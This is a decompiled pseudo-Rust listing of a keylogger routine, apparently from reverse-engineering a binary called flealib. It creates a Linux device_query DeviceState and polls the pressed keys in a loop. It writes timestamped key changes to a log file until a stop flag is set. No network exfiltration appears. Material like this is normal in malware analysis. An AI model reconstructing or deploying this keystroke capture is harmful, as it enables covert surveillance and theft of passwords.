
  fn flealib::keylogger::run::h87b81c5530122dda(arg1: *mut i128, arg2: *mut c_void) -> *mut i64

{
    let mut var_108: *mut c_void = arg2;
    let mut rbp: i64;
    rbp = 1;
    let var_b0: *mut i128 = arg1;
    let mut var_100: *mut i128 =
        device_query::device_state::linux::DeviceState::new::h85eaeab3eb11e402();
    let mut var_128: i64 = 0;
    let var_120: i64 = 1;
    let mut var_118: *mut *mut *const *const i8 = nullptr;
    let mut var_f8: *const i8 = 0x1b600000000;
    let mut var_ec: i16 = 0;
    let mut var_f0: i32 = 0;
    var_ec = 1;
    *var_f0[2] = 1;
    let var_98: i64 = arg1[1];
    let mut var_a8: i128 = *arg1;
    let mut var_c8: *const *const i8;
    std::fs::OpenOptions::open::h8371f65deb3b5c6c(&var_c8, &var_f8, &var_a8);
    let mut fd: i32 = core::result::Result$LT$T$C$E$GT$::expect::haa955ffa68429013(&var_c8);
    let mut var_40: ();
    chrono::offset::local::Local::now::hca9c0f908c2b914d(&var_40);
    var_f8 = "%Y-%m-%d %H:%M:%S[]\nFailed to o…";
    var_f0 = 0x11;
    let var_e8: i64 = 8;
    let var_e0: i64 = 0;
    let mut var_d8: i8 = 0;
    chrono::datetime::DateTime$LT$Tz$GT$::format_with_items::h5a76f879a559b27a(&var_a8, &var_40, 
        &var_f8);
    _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h20ea0768b3eb5f09(&var_c8, 
        &var_a8);
    let mut var_50: *mut *const *const i8 = &var_c8;
    let var_48: fn(arg1: *mut c_void, arg2: *mut c_void) -> i64 =
        _$LT$alloc..string..String$u20$as$u20$core..fmt..Debug$GT$::fmt::h1887dc6ebeddb523;
    var_f8 = &data_b0b9b0;
    var_f0 = 2;
    var_d8 = 0;
    let var_e8_1: *mut *mut *const *const i8 = &var_50;
    let var_e0_1: i64 = 1;
    core::result::Result$LT$T$C$E$GT$::expect::h97b316d058ec8231(
        std::io::Write::write_fmt::hdf334e0e7fdeaff7(&fd, &var_f8));
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::hd935b2ddfd513885(&var_c8);
    core::ptr::drop_in_place$LT$chrono..format..formatting..DelayedFormat$LT$chrono..format..strftime..StrftimeItems$GT$$GT$::h35c450be2a355fff(&var_a8);
    let mut rax_9: *mut i32;
    let mut rdx_4: i8;
    
    loop
    {
        _$LT$device_query..device_state..linux..DeviceState$u20$as$u20$device_query..device_query..DeviceQuery$GT$::get_keys::hb2c15ef766e541d3(&var_f8, &var_100);
        let mut rax_4: *mut i8;
        let mut rdx_2: i64;
        rax_4 = _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..ops..index..Index$LT$I$GT$$GT$::index::h124ad9b75a483d4d(var_120);
        
        if _$LT$$u5b$A$u5d$$u20$as$u20$core..slice..cmp..SlicePartialEq$LT$B$GT$$GT$::equal::ha62555823fa75279(var_f0, var_e8_1, rax_4, rdx_2) == 0 && var_e8_1 != 0
        {
            var_c8 = &var_f8;
            let var_c0_1: fn(arg1: *mut c_void, arg2: *mut c_void) -> i64 = _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..fmt..Debug$GT$::fmt::h87d7b420a6ce0922;
            var_a8 = &data_44fb30;
            *var_a8[8] = 1;
            let var_88_1: i64 = 0;
            let var_98_1: *mut *const *const i8 = &var_c8;
            let var_90_1: i64 = 1;
            core::result::Result$LT$T$C$E$GT$::expect::h97b316d058ec8231(
                std::io::Write::write_fmt::hdf334e0e7fdeaff7(&fd, &var_a8));
        }
        
        var_a8 = var_f8;
        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$device_query..keymap..Keycode$GT$$GT$::h105afaa7bb6ce9fc(&var_128);
        var_118 = var_e8_1;
        var_128 = var_a8;
        std::sync::mutex::Mutex$LT$T$GT$::lock::hc1a133ff57aa1c3e(&var_a8, 
            var_108.byte_offset(0x10));
        rax_9 = core::result::Result$LT$T$C$E$GT$::unwrap::h46532edc52e964b3(&var_a8);
        rdx_4 &= 1;
        
        if *rax_9.byte_offset(5) != 0
        {
            break;
        }
        
        core::ptr::drop_in_place$LT$std..sync..mutex..MutexGuard$LT$flealib..keylogger..Keylogger$GT$$GT$::hc1ba6f9969cba242(rax_9, rdx_4);
        std::thread::sleep::h1a6eeffe1c923e1f(0, 0x989680);
    }
    
    core::ptr::drop_in_place$LT$std..sync..mutex..MutexGuard$LT$flealib..keylogger..Keylogger$GT$$GT$::hc1ba6f9969cba242(rax_9, rdx_4);
    core::ptr::drop_in_place$LT$std..fs..File$GT$::h427eb749d8d610e5(fd);
    core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$device_query..keymap..Keycode$GT$$GT$::h105afaa7bb6ce9fc(&var_128);
    core::ptr::drop_in_place$LT$device_query..device_state..linux..DeviceState$GT$::h084f2ce93c8b7089(&var_100);
    core::ptr::drop_in_place$LT$alloc..sync..Arc$LT$std..sync..mutex..Mutex$LT$flealib..keylogger..Keylogger$GT$$GT$$GT$::h218e3e30bfeebf8a(&var_108)
}
